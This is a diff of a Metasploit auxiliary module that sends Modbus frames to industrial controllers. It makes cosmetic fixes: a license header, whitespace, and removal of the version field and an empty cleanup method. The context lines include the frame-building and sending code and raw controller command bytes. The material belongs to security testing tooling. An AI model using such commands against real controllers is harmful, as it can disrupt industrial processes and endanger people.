@@ -1,3 +1,10 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
@@ -18,7 +25,7 @@ class Metasploit3 < Msf::Auxiliary
 				DigitalBond.
 			},
 			'Author'         =>
-				[ 
+				[
 					'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
 					'todb' # Metasploit fixups
 				],
@@ -27,7 +34,6 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					[ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
 				],
-			'Version'        => '$Revision$',
 			'DisclosureDate' => 'Apr 5 2012'
 			))
 		register_options(
@@ -42,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 			], self.class)
 
 	end
-	
+
 	# this is used for building a Modbus frame
 	# just prepends the payload with a modbus header
 	def makeframe(packetdata)
@@ -57,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
 		payload += [packetdata.size].pack("c") # size byte
 		payload += packetdata
 	end
-	
+
 	# a wrapper just to be sure we increment the counter
 	def sendframe(payload)
 		sock.put(payload)
@@ -159,9 +165,6 @@ class Metasploit3 < Msf::Auxiliary
 		sendframe(makeframe(payload))
 		payload = "\x00\x5a\x01\x04"
 		sendframe(makeframe(payload))
-	end
-
-	def cleanup
 	end
 
 	def run
